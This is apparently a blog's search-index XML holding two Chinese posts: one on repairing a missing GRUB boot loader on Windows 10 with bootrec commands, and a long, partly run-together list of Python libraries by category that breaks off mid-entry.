<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>电脑开机显示找不到grub引导（win10系统）</title>
      <link href="/2021/04-08-windows1-error-resolve.html"/>
      <url>/2021/04-08-windows1-error-resolve.html</url>
      <content type="html"><![CDATA[<p>安装双系统windows和ubuntu后，默认引导是Ubuntu的界面，在删除掉ubuntu系统后会导致找不到grub引导。<br>显示:<br>error: no such device<br>grub rescue&gt;<br>可以用u盘制作一个win10的系统启动盘,然后按下列步骤解决，亲测成功（最坏的解决办法是重装系统）。<br>步骤如下：<br>1.进到u盘的系统安装界面<br>2.选定原来的windows系统所在磁盘，按住shift+F10，调出cmd<br>3.依次键入bootrec /fixmbr 回车；bootrec /fixboot 回车；（命令将尝试修复主引导记录的损坏问题）<br>4.重启</p>]]></content>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python常用库</title>
      <link href="/2020/04-11-python-packages.html"/>
      <url>/2020/04-11-python-packages.html</url>
      <content type="html"><![CDATA[<p>库名称简介</p><p>Chardet 字符编码探测器，可以自动检测文本、网页、xml的编码。</p><p>colorama 主要用来给文本添加各种颜色，并且非常简单易用。</p><p>Prettytable 主要用于在终端或浏览器端构建格式化的输出。</p><p>difflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。</p><p>fuzzywuzzy 字符串模糊匹配。</p><p>esmre 正则表达式的加速器。</p><p>shortuuid 一组简洁URL/UUID函数库。</p><p>ftfy，Unicode文本工具7</p><p>unidecode，ascii和Unicode文本转换函数。</p><p>xpinyin，将汉字转换为拼音的函数库</p><p>pangu.py，调整对中日韩文字当中的字母、数字间距。</p><p>pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片</p><p>uniout，提取字符串中可读写的字符</p><p>awesome slugify，一个Python slugify库，用于处理Unicode。</p><p>python-slugify，转换Unicode为ASCII内码的slugify函数库。</p><p>unicode-slugify，生成unicode内码，Django的依赖包。</p><p>ply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。</p><p>python-user-agents，浏览器的用户代理（user-agents）的解析器。</p><p>sqlparse，SQL解析器。</p><p>pygments，一个通用的语法高亮工具。</p><p>python-nameparser，解析人名，分解为单独的成分。</p><p>pyparsing，通用解析器生成框架。</p><p>tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。</p><p>python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。</p><p>xlwt/xlrd，读写Excel格式的数据文件。</p><p>xlsxwriter，创建Excel格式的xlsx文件。</p><p>xlwings，利用Python调用Excelcsvkit，CSV文件工具包。</p><p>marmir，把Python[数据结构]，转化为电子表格。</p><p>pdfminer，从PDF文件中提取信息。</p><p>pypdf2， 合并和转换PDF页面的函数库。</p><p>Python-Markdown，轻量级标记语言Markdown的Python实现。</p><p>Mistune，,快速、全功能的纯Python编写的Markdown解释器。</p><p>dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成</p><p>datetime，而rrule是则是根据定义的规则来生成datetime。</p><p>arrow,更好的日期和时间处理Python库</p><p>chronyk，一个Python 3版函数库，用于解析人写的时间和日期。</p><p>delorean，清理期时间的函数库。</p><p>when.py，为见的日期和时间，提供人性化的功能。</p><p>moment，类似Moment.js的日期/时间Python库</p><p>pytz，世界时区，使用tz database时区信息[数据库]</p><p>BeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。</p><p>lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。</p><p>htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。</p><p>pyyaml，Python版本的YAML解释器。</p><p>html5lib，-标准库，解析和序列化HTML文档和片段。</p><p>pyquery，类似[jQuery]的的HTML解释器函数库。</p><p>cssutils，Python CSS库。</p><p>MarkupSafe，XML或HTML / XHTML安全字符串标记工具。</p><p>cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。</p><p>xmltodict，类似JSON的XML工具包。</p><p>xhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。</p><p>untangle，把XML文档，转换为Python对象，方便访问。</p><p>文件处理</p><p>库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。</p><p>imghdr，Python标准库，确定图像类型。</p><p>python-magic，libmagic文件类型识别库，Python接口格式。</p><p>path.py，os.path模块的二次封装。</p><p>watchdog，一组API和shell实用程序，用于监视文件系统事件。</p><p>Unipath，面向对象的文件/目录的操作工具包。</p><p>pathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。</p><p>cPickle是[C语言]实现的版本，速度更快。</p><p>ConfigParser，Python标准库，INI文件解析器。</p><p>configobj，INI文件解析器。</p><p>config，分层次配置，logging作者编写。</p><p>profig，多格式配置转换工具。</p><p>logging，Python标准库，日志文件生成管理函数库。</p><p>logbook，logging的替换品。</p><p>Sentry，实时log服务器。</p><p>Raven，哨兵Sentry的Python客户端。</p><p>Sphinx，斯芬克斯（狮身人面像），Python文档生成器。</p><p>reStructuredText，标记语法和解析工具，Docutils组件。</p><p>mkdocs，Markdown格式文档生成器。</p><p>pycco，简单快速、编程风格的文档生成器。</p><p>pdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具</p><p>图像处理</p><p>库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。</p><p>Pillow，图像处理库，PIL图像库的分支和升级替代产品。</p><p>Matplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。</p><p>brewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。</p><p>PyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。</p><p>Box2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。</p><p>Pymunk，类似box2d的开源物理图形模拟库。</p><p>OpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。</p><p>SimpleCV，计算机视觉开源框架，类似opencv。</p><p>VTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。</p><p>cgkit,Python Computer Graphics Kit,其module 主要分两个部分</p><ol><li><p>与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用;</p></li><li><p>提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。</p></li></ol><p>CGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。</p><p>Aggdraw，开源图像库，几乎涵盖了2d image操作的所有功能，使用起来非常灵活。</p><p>Pycairo,开源矢量绘图库</p><p>Cairo开罗的python接口，cairo提供在多个背景下做2-D的绘图，高级的更可以使用硬件加速功能。</p><p>wand，Python绑定魔杖工具（MagickWand），C语言API接口。</p><p>thumbor， -智能成像工具，可调整大小和翻转图像。</p><p>imgSeek，查询相似的图像。</p><p>python-qrcode，纯Python的二维码（QR码）生成器。</p><p>pyBarcode，创建条码，无需PIL模块。</p><p>pygram，Instagram像图像过滤器。</p><p>Quads，基于四叉树的计算机艺术。</p><p>nude.py，裸体检测函数。</p><p>scikit-image，scikit工具箱的图像处理库。</p><p>hmap，图像直方图工具。</p><p>bokeh，交互的Web绘图。</p><p>plotly，Web协同的Python和Matplotlib绘制。</p><p>vincent，文森特，Python Vega的函数库。</p><p>d3py，Python绘图库，基于D3.JS, ggplot -API兼容R语言的ggplot2.Kartograph.py，在Python绘制漂亮的SVG地图。</p><p>pygal， SVG图表的创造者。</p><p>pygraphviz，Graphviz的Python接口。</p><p>Fonttlools，ttf字体工具函数包，用于fontforge、ttx等字体软件。</p><p>游戏和多媒体</p><p>库名称简介audiolazy，数字信号处理（DSP）的Python工具包。</p><p>audioread，跨平台（GStreamer + Core Audio + MAD + FFmpeg）音频解码库。</p><p>beets，音乐库管理。dejavu，音频指纹识别算法。</p><p>Dejavu 听一次音频后就会记录该音频的指纹信息，然后可通过麦克风对输入的音频进行识别是否同一首歌。</p><p>django-elastic-transcoder,Django +亚马逊elastic转码。</p><p>eyeD3,音频文件工具，特别是MP3文件包含的ID3元数据。</p><p>id3reader，用于读取MP3的元数据。</p><p>mutagen，处理音频元数据。</p><p>pydub，-操纵音频和简单的高层次的接口。</p><p>pyechonest，Echo Nest API客户端。</p><p>talkbox，语音和信号处理的Python库。</p><p>TimeSide，开放的网络音频处理框架。</p><p>tinytag，读取音乐文件元数据，包括的MP3，OGG，FLAC和wave文件。</p><p>m3u8，用于解析m3u8文件。</p><p>moviepy，多格式视频编辑脚本模块，包括GIF动画。</p><p>shorten.tv，视频摘要。scikit视频，SciPy视频处理例程。</p><p>GeoDjango,一个世界级的地理Web框架。</p><p>geopy,Geo地理编码的工具箱。</p><p>pygeoip，纯Python写的GeoIP API。</p><p>GeoIP，Python API接口，使用高精度GeoIP Legacy Database数据库。</p><p>geojson，GeoJSON函数库django-countries，一个Django程序，提供国家选择，国旗图标的静态文件，和一个国家的地域模型。</p><p>Pygame，Python游戏设计模块。</p><p>Cocos2d，2D游戏框架，演示，和其他的图形/交互应用，基于pyglet。Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2，SDL2的封装库。</p><p>Panda3D- 3D游戏引擎，迪士尼开发。用C++写的，完全兼容Python。</p><p>PyOgre，OGRE 3D渲染引擎，可用于游戏，模拟，任何3D。</p><p>PyOpenGL，绑定OpenGL和它相关的API。</p><p>PySFML，Python绑定SFMLRenPy，视觉小说引擎。</p><p>大数据与科学计算</p><p>库名称简介pycuda/opencl，GPU高性能并发计算Pandas，python实现的类似R语言的数据统计、分析平台。基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。</p><p>Open Mining，商业智能（BI），Pandas的Web界面。</p><p>blaze，NumPy和Pandas大数据界面。</p><p>SciPy，开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。</p><p>ScientificPython，一组经过挑选的Python程序模块，用于科学计算，包括几何学（矢量、张量、变换、矢量和张量场），四元数，自动求导数，（线性）插值，多项式，基础统计学，非线性最小二乘拟合，单位计算，Fortran兼容的文本格式，通过VRML的3D显示，以及两个Tk小工具，分别用于绘制线图和3D网格模型。此外还具有到netCDF，MPI和BSPlib库的接口。</p><p>NumPy科学计算库，提供了矩阵，线性代数，傅立叶变换等等的解决方案, 最常用的是它的N维数组对象. NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。</p><p>Cvxopt，最优化计算包，可进行线性规划、二次规划、半正定规划等的计算。</p><p>Numba，科学计算速度优化编译器。</p><p>pymvpa2，是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p><p>NetworkX，复杂网络的优化软件包。</p><p>zipline，交易算法的函数库。</p><p>PyDy， Python动态建模函数库。</p><p>SymPy,符号数学的Python库。</p><p>statsmodels,Python的统计建模和计量经济学。</p><p>astropy,天文学界的Python库。</p><p>orange，橙色，数据挖掘，数据可视化，通过可视化编程或Python脚本学习机分析。RDKit,化学信息学和机器学习的软件。</p><p>Open Babel，巴贝尔，开放的化学工具箱。</p><p>cclib，化学软件包的计算函数库。</p><p>Biopython，免费的生物计算工具包。</p><p>bccb，生物分析相关的代码集。</p><p>bcbio-nextgen，提供完全自动化、高通量、测序分析的工具包。</p><p>visvis, 可视化计算模块库，可进行一维到四维数据的可视化。</p><p>MapReduce是Google提出的一个软件[架构]，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的MapReduce函数库。</p><p>Framworks and libraries for MapReduce.,PySpark，[Spark]的Python API。dpark，Spark的Python克隆，Python中的MapReduce框架。</p><p>luigi，为批量工作，建立复杂的管道。</p><p>mrjob，运行在[Hadoop]，或亚马逊网络服务的，MapReduce工作。</p><p>人工智能与机器学习</p><p>库名称简介NLTK（natural language toolkit)，是python的自然语言处理工具包。2001年推出，包括了大量的词料库，以及自然语言处理方面的算法实现：分词， 词根计算， 分类， 语义分析等。</p><p>Pattern，数据挖掘模块，包括自然语言处理，机器学习工具，等等。</p><p>textblob，提供API为自然语言处理、分解NLP任务。基于NLTK和Pattern模块。</p><p>jieba，结巴，中文分词工具。</p><p>snownlp，用于处理中文文本库。</p><p>loso，中文分词函数库。</p><p>genius，中文CRF基础库，条件随机场(conditional random field,简称 CRF),是一种鉴别式机率模型,是随机场的一种,常用于标注或分析序列资料,如自然语言文字或是生物序列。</p><p>Gensim，一个相当专业的主题模型Python工具包，无论是代码还是文档，可用于如何计算两个文档的相似度LIBSVM,是台湾大学林智仁(Lin Chih-Jen)教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，他不但提供了编译好的可在Windows系列系统的执行文件，还提供了源代码，方便改进、修改以及在其它[操作系统]上应用；该软件对SVM所涉及的参数调节相对比较少，提供了很多的默认参数，利用这些默认参数可以解决很多问题；并提供了交互检验(Cross Validation)的功能。该软件可以解决C-SVM、ν-SVM、ε-SVR和ν-SVR等问题，包括基于一对一算法的多类模式识别问题。</p><p>scikits.learn，构建在SciPy之上用于机器学习的 Python 模块。它包括简单而高效的工具，可用于数据挖掘和数据分析。涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。</p><p>PyMC，机器学习采样工具包，scikit-learn似乎是所有人的宠儿，有人认为，PyMC更有魅力。PyMC主要用来做Bayesian分析。</p><p>Orange，基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。侧重数据挖掘，可以用可视化语言或Python进行操作，拥有机器学习组件，还具有生物信息学以及文本挖掘的插件。</p><p>Milk，机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。</p><p>PyMVPA(Multivariate Pattern Analysis in Python),是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p><p>NuPIC，开源人工智能平台。该项目由Grok（原名 Numenta）公司开发，其中包括了公司的算法和软件架构。NuPIC 的运作接近于人脑，“当模式变化的时候，它会忘掉旧模式，记忆新模式”。如人脑一样，CLA 算法能够适应新的变化。</p><p>Pylearn2，-基于Theano的机器学习库。</p><p>hebel，GPU加速，[深度学习]Python库。</p><p>gensim，机器学习库。</p><p>pybrain，机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。pybrain包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。以神经网络为核心，所有的训练方法都以神经网络为一个实例Mahout,是 Apache Software Foundation（ASF） 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。Mahout包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。此外，通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到云中。</p><p>Crab，灵活的，快速的推荐引擎。</p><p>python-recsys，娱乐系统分析，推荐系统。</p><p>vowpal_porpoise，Vowpal Wabbit轻量级Python封装。</p><p>Theano,用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题的python软件包。它使得写深度学习模型更加容易，同时也给出了一些关于在GPU上训练它们的选项。</p><p>系统与命令行</p><p>库名称简介threading，Python标准线程库，更高级别的线程接口。</p><p>envoy，特使，Python子线程的函数库。</p><p>sh，成熟的子线程替换函数库。</p><p>sarge，封装线程。</p><p>subprocess,调用shell命令的神器argparse，写命令行脚本必备，强大的命令行差数解析工具timeit，计算代码运行的时间等等unp，命令行工具，解压文件。</p><p>eventlet开销很少的多线程模块，使用的是 green threads 概念，例如，pool = eventlet.GreenPool(10000) 这样一条语句便创建了一个可以处理 10000 个客户端连接的线程池。类似Gevent线程库Gevent，多线程模块pytools,著名的python通用函数、工具包SendKeys, 键盘鼠标操作模块, 模拟键盘鼠标模拟操作。</p><p>pyHook,基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。</p><p>pstuil,跨平台地很方便获取和控制系统的进程，以及读取系统的CPU占用内存占用等信息.</p><p>cement，一个轻量级的、功能齐全的命令行工具</p><p>click，简单优雅的的命令行接口。</p><p>clint，Python命令行工具。</p><p>cliff，创造多层次指令的命令行程序框架。</p><p>Clime， 可以转换任何模块为多的CLI命令程序，无任何配置。</p><p>docopt，Python命令行参数分析器。</p><p>pycli，命令行应用程序，支持的标准命令行解析，测井，单元[测试]和功能测试。</p><p>Gooey，打开命令行程序，作为为一个完整的GUI应用程序,cookiecutter，命令行工具，从cookiecutters（项目模板）创建项目。例如，Python包项目，jQuery插件项目。percol，为UNIX传统管道pipe命令，添加交互式选择风格。</p><p>rainbowstream，聪明和漂亮的推特客户终端。</p><p>Django Models，Django的一部分SQLAlchemy，Python SQL工具包和对象关系映射。</p><p>peewee，小型的ORM解析器。</p><p>PonyORM，为ORM提供了一种面向SQL的接口。</p><p>MongoEngine，Python对象文件映射，使用[MongoDB]。, Django MongoDB引擎MongoDB , Django后台。</p><p>django-mongodb-engine，Django后台.redisco,一个简单的模型和容器库，使用[Redis]flywheel，Amazon DynamoDB对象映射。</p><p>butterdb，谷歌电子表格的ORM，Python版。</p><p>celery，芹菜，异步任务队列/工作，基于分布式消息队列。</p><p>huey，休伊，轻量级，多线程任务队列。</p><p>mrq，队列先生，分布式任务队列，使用redis &amp; Gevent。</p><p>rq，简单的工作队列。</p><p>Queue,Queue模块可以用来实现多线程间通讯，让各个线程共享数据，生产者把货物放到Queue中，供消费者（线程）去使用。</p><p>simpleq，简单的，可扩展的队列，Amazon SQS基础队列。</p><p>Psyco，超强的python性能优化工具，psyco 的神奇在于它只需要在代码的入口处调用短短两行代码，性能就能提升 40% 或更多，真可谓是立竿见影！如果你的客户觉得你的程序有点慢，敬请不要急着去优化代码，psyco 或许能让他立即改变看法。psyco 堪称 Python 的 jit。fn.py，Python函数编程：缺失的功能享受FP的实现。</p><p>funcy，函数编程工具。</p><p>Toolz，函数编程工具：迭代器、函数，字典。</p><p>CyToolz，Toolz的Cython实现，高性能的函数编程工具。</p><p>Ansible，安塞波，极为简单的自动化平台。</p><p>SaltStack，基础设施的自动化管理系统。</p><p>Fabric，织物，一个简单，远程执行和部署的语言工具。</p><p>Fabtools，Fabric的工具函数。</p><p>cuisine，热门的Fabric的工具函数。</p><p>psutil，跨平台的过程和系统工具模块。</p><p>pexpect，控制互动节目。</p><p>provy，易于使用的配置系统的Python。</p><p>honcho，Foreman的Python接口，用于管理procfile应用工具。</p><p>gunnery，多任务执行工具，与网络接口的分布式系统。</p><p>fig，快速。独立的开发环境中使用泊坞窗。</p><p>APScheduler，轻量级、但功能强大的在线任务调度程序。</p><p>django-schedule,Django日程应用程序。</p><p>doit,任务流道/生成工具。</p><p>Joblib,Python提供的轻量级的流水线工具函数。</p><p>Plan，简易生成crontab文件。</p><p>Spiff，纯Python实现的，功能强大的工作流引擎。</p><p>schedule，Python作业调度。</p><p>TaskFlow，有助于使任务执行简单。</p><p>ctypes，Python标准库，速度更快，Python调用C代码的外部函数接口。</p><p>cffi，Python调用C代码外部函数接口，类似于ctypes直接在python程序中调用c程序,但是比ctypes更方便不要求编译成so再调用。</p><p>Cytoolz，python 加速库SWIG，简化封装和接口生成器。</p><p>Cython，Python优化静态编译器。</p><p>PyPy，Python解释器的 Python实现。</p><p>Stackless Python，一个增强版本的Python。它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。Stackless为 Python带来的微线程扩展，是一种低开销、轻量级的便利工具Pyston,使用LLVM和现代JIT技术,对python进行性能优化。</p><p>pythonlibs，非官方的Windows（32 / 64位）的Python扩展包scapy，优秀的数据包处理库。</p><p>ino，Arduino命令行工具。</p><p>Pyro，Python的机器人工具包。</p><p>pluginbase，一个简单而灵活的Python的插件系统。</p><p>itsdangerous，数据安全传输工具。</p><p>blinker，快速Python中的信号/事件调度系统。</p><p>pychievements，用于创建和跟踪成果框架。</p><p>python-patterns，Python中的设计模式。</p><p>pefileWindows PE文件解析器SIP，自动为C和C++库生成Python扩展模块的工具。</p><p>数据库</p><p>库名称简介MySQLdb，成熟的[MySQL]数据库模块,Baresql,SQL数据库包ZODB，Python本地对象数据库。一个K-V对象图数据库。</p><p>pickledb,简单和轻量级的K-V键值存储。</p><p>TinyDB, 轻量级，面向文档的数据库。</p><p>mysql-python，MySQL的Python工具库。</p><p>mysqlclient，mysql-python分支，支持Python 3.,PyMySQL,纯Python写的 MySQL驱动程序，兼容mysql-python。</p><p>mysql-connector-python,MySQL连接器,来自[Oracle]，纯Python编写。</p><p>oursql，MySQL连接器，提供本地话指令语句和BLOBs支持。</p><p>psycopg2，最流行的Python PostgreSQL适配器。</p><p>txpostgres，于Twisted的异步驱动，用于PostgreSQL。</p><p>queries,psycopg2函数库，用于PostgreSQL。dataset,存储Python字典数据,用于SQLite，MySQL和PostgreSQL。</p><p>cassandra-python-driver，开源分布式NoSQL数据库系统Apache Cassandra系统的Python驱动.pycassa,简化的cassandra数据库Python驱动。</p><p>HappyBase，友好的Apache [Hbase]的函数库。</p><p>PyMongo，MongoDB官方客户端。</p><p>Plyvel，LevelDB快速和功能丰富的Python接口。</p><p>redis-py,redis客户端。</p><p>py2neo,Python客户端(基于Neo4j的RESTful接口).</p><p>telephus,基于Twisted的cassandra客户端。</p><p>txRedis，基于Twisted的Redis客户端。</p><p>在学习Python的过程中，往往因为没有资料或者没人指导从而导致自己不想学下去了，因此我特意准备了个群 592539176 ，群里有大量的PDF书籍、教程都给大家免费使用！不管是学习到哪个阶段的小伙伴都可以获取到自己相对应的资料！</p><p>【网络】</p><p>Curl，Pycurl包是一个libcurl的Python接口，它是由C语言编写的。与urllib相比，它的速度要快很多。Libcurl是一个支持FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 和 LDAP的客户端URL传输库.libcurl也支持HTTPS认证,HTTP POST,HTTP PUT,FTP上传,代理,Cookies,基本身份验证,FTP文件断点继传,HTTP代理通道等等。</p><p>Requests，用Python语言编写，基于 urllib的开源 HTTP 库。它比 urllib 更加方便，更加 Pythoner。支持 Python3。</p><p>httpie，命令行HTTP客户端，用户友好的cURL的替换工具。</p><p>s3cmd，命令行工具，用于管理Amazon S3和CloudFront。</p><p>youtube-dl，命令行程序，从YouTube下载视频。</p><p>you-get，Python3写的视频下载工具，可用于YouTube/Youku优酷/Niconico视频下载Coursera，从coursera.org下载视频，可重新命名文件wikiteam，wiki下载工具。</p><p>subliminal，命令行工具，搜索和下载字幕的函数库。</p><p>requests，HTTP函数库，更加人性化。</p><p>grequests，异步HTTP请求+ Gevent（高性能高并发函数库）。</p><p>urllib3，一个线程安全的HTTP连接池，支持文件post。</p><p>httplib2，综合HTTP的客户端函数库。</p><p>treq， Python API接口，Twisted的HTTP客户。</p><p>Mininet，流行的网络仿真器,API采用python编写。</p><p>POX，基于Python的开源软件定义网络（SDN）控制开发平台的应用，如OpenFlow的SDN控制器。</p><p>Pyretic，SDN的编程语言，提供了强大的抽象在网络交换机或仿真器。</p><p>SDX Platform，基于SDN的IXP实现，利用最小网络，痘和热。</p><p>inbox.py，Python的SMTP服务器。</p><p>imbox， Python版本IMAP库。</p><p>inbox，收件箱，开源邮件工具包。</p><p>lamson,SMTP服务器。</p><p>flanker,侧卫,电子邮件地址和MIME解析库。</p><p>marrow.mailer,高性能可扩展邮件交付框架。</p><p>django-celery-ses， Django电子邮件后台，使用AWS SES和Celery。</p><p>modoboa，邮件托管和管理平台，包括现代和简化Web UI。</p><p>envelopes，邮件工具。</p><p>mailjet，批量邮寄mailjet API接口，带统计。</p><p>Talon，利爪，Mailgun库，提取消息和签名。mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and signatures.,pyzmail，编写，发送和解析电子邮件。</p><p>furl，燃料，小型的的URL解析库库。</p><p>purl，简单的，干净的API，操纵URL。</p><p>pyshorteners，纯Python库，URL短网址编辑。</p><p>short_url，短网址生成。</p><p>Scrapy，快速屏幕截取和网页抓取的框架。</p><p>portia，波西亚，Scrapy的可视化扩展。</p><p>feedparser，信息源解释器</p><p>RoboBrowser，简单的网页浏览Python函数库，没有使用Web浏览器。</p><p>MechanicalSoup，网站自动化互动测试工具包。</p><p>mechanize，网页浏览编程工具。</p><p>Demiurge，造物主，-PyQuery的轻量级工具。</p><p>newspaper,提取报纸新闻。</p><p>html2text,转换HTML为 Markdown格式的文本。</p><p>python-goose,HTML内容提取器。</p><p>lassie,莱西,人性化的网站内容检索。</p><p>micawber,通过UR抓提网页的函数库。</p><p>sumy，概要，文本和HTML网页的自动文摘模块。</p><p>Haul，距离，可扩展的图像爬虫。</p><p>python-readability,可读性工具Arc90,快速的Python接口。</p><p>opengraph,OpenGraphProtocol协议解析模块,textract，从任何文件，Word，PowerPoint，PDF文件中提取文本，等。</p><p>sanitize，消毒，使混乱的数据变的理智。</p><p>AutobahnPython， WebSocket和WAMP的函数库，使用 Twisted和PythonWebSocket-for-Python，websocket客户端和服务器端函数库。</p><p>SimpleXMLRPCServer，python标准库，简单的XML-RPC服务器，单线程。SimpleJSONRPCServer，JSON-RPC规范实施函数库。</p><p>zeroRPC，基于ZeroMQ和MessagePack的RPC实现。</p><p>apache-libcloud，所有云服务的Python接口库。</p><p>wifi，WiFi -一套个Python库和命令行工具与WiFi，用于[Linux]。</p><p>streamparse，运行Python代码和数据的实时流。集成了Apache Storm。</p><p>boto，亚马逊网络服务接口。</p><p>twython，Twitter推特API。</p><p>google-api-python-client，谷歌客户端API。</p><p>gspread，谷歌电子表格的Python API。</p><p>facebook-sdk，facebook平台Python SDK。</p><p>facepy，简易的facebook图形APIgmail，Gmail的Python接口。</p><p>django-wordpress，Django的WordPress的模型和视图。</p><p>Web框架</p><p>Django，最流行的Python-Web框架，鼓励快速开发,并遵循MVC设计，开发周期短ActiveGrid企业级的Web2.0解决方案Karrigell简单的Web框架，自身包含了Web服务，py脚本引擎和纯python的数据库</p><p>PyDBLitewebpy 一个小巧灵活的Web框架，虽然简单但是功能强大CherryPy基于Python的Web应用程序开发框架。</p><p>Pylons 基于Python的一个极其高效和可靠的Web开发框架</p><p>Zope 开源的Web应用服务器</p><p>TurboGears 基于Python的MVC风格的Web应用程序框架Twisted流行的网络编程库，大型Web框架。</p><p>QuixoteWeb开发框架Flask,轻量级web框架。</p><p>Bottle，快速，简单和轻量级的WSGI模式Web框架。</p><p>Pyramid，轻量级，快速，稳定的开源Web框架。</p><p>web2py，简单易用的全堆栈Web框架和平台。</p><p>web.py，强大、简单的Web框架。</p><p>TurboGears，便于扩展的Web框架。</p><p>CherryPy，极简Python Web框架，支持，HTTP 1.1和WSGI线程池。</p><p>Grok，基于Zope3的Web框架。</p><p>Bluebream，开源的Web应用服务器，原名Zope 3。</p><p>guava，轻量级，高性能的Python-Web框架，采用c语言编写。</p><p>django-cms，基于Django企业级开源CMS。</p><p>djedi-cms轻量级但功能强大的Django 